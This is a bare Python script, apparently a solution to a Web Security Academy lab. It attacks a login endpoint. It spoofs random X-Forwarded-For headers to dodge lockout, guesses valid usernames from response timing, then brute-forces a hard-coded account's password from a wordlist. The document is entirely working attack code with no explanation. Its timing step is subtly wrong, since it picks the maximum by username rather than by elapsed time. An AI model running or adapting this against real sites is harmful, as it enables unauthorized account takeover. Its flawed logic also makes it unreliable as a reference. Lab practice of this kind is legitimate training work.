import requests
import random

lst = {}
url = 'https://ac5b1ff31fac3626c0cb0f9200f700dd.web-security-academy.net/login'

with open('user.txt') as f:
	user = f.read().split()
	for i in user: 
		header = {'X-Forwarded-For': '127.0.0.{}'.format(random.randint(1,100))}
		data = {'username': i ,'password': 'a'*100}
		r = requests.post(url, data=data, headers=header)
		print('Try username : ' + i)
		lst[r.elapsed.total_seconds()] = i

print(lst)
max_key = max(lst, key=lst.get)
print(max_key)
print(lst[max_key])

u = 'vagrant'

with open('pass.txt') as f:
	pass_ = f.read().split()
	for i in pass_: 
		header = {'X-Forwarded-For': '127.0.0.{}'.format(random.randint(1,100))}
		data = {'username': u ,'password': i}
		r2 = requests.post(url, data=data, headers=header)
		print('Try account : ' + u + ' - ' + i)
		if r2.status_code == 302:
			p = i
			break 
print('Correct : ' + u + ' : ' + p)

# print(type(requests.get(url).status_code))